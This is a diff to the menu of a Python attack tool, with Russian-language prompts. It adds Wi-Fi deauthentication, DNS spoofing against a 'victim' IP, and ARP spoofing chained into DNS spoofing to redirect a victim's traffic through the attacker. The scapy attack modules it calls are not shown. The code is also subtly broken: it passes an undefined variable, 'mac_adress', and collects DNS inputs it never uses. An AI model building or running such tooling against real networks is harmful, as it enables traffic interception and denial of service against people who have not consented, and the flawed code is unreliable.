@@ -29,15 +29,28 @@ if __name__ == "__main__":
 
         if choice == '1':
             print("Отправка мертвых пакетов...")
-            scapy_utils.send_deauth()  # Реализуй отправку мертвых пакетов
+            mac_address = input('Copy mac_adress here')
+            scapy_utils.send_deauth(mac_adress)  
         elif choice == '2':
+            victim_ip = input("Введите IP жертвы: ") 
+            dns_server_ip = input("Введите IP DNS сервера: ") # 127.0.0.1
+            spoofed_domain = input("Введите подменяемый домен: ") # some.com
+            spoofed_ip = input("Введите подменяемый IP: ") # 0.0.0.0
             print("Запуск DNS Spoofing...")
             spoofer = dns_spoofing.DNSSpoofer(victim_ip, dns_server.DNS_SERVER_IP, dns_server.SPOOFED_DOMAIN, dns_server.SPOOFED_IP)
             spoofer.run()
         elif choice == '3':
             print("Запуск ARP Spoofing...")
-            arper = arp_spoofing.Arper(victim_ip, gateway_ip, network_interface)
+            victim_ip = input('IP жертвы')  
+            gateway_ip = input('IP шлюза (маршрутизатора)') 
+            network_interface = 'en0'  # Имя сетевого интерфейса
+            victimmac = input('Mac adress of victim') # b0:be:83:43:9e:9d 
+            gatewaymac = input("Mac adress of router") # 28:87:ba:8b:de:7c
+            arper = arp_spoofing.Arper(victim_ip, gateway_ip, victimmac, gatewaymac, network_interface)
             arper.run()
+            time.sleep(5)
+            spoofer = dns_spoofing.DNSSpoofer(victim_ip, dns_server.DNS_SERVER_IP, dns_server.SPOOFED_DOMAIN, dns_server.SPOOFED_IP)
+            spoofer.run()
         elif choice == '4':
             print("Остановка программы.")
             break
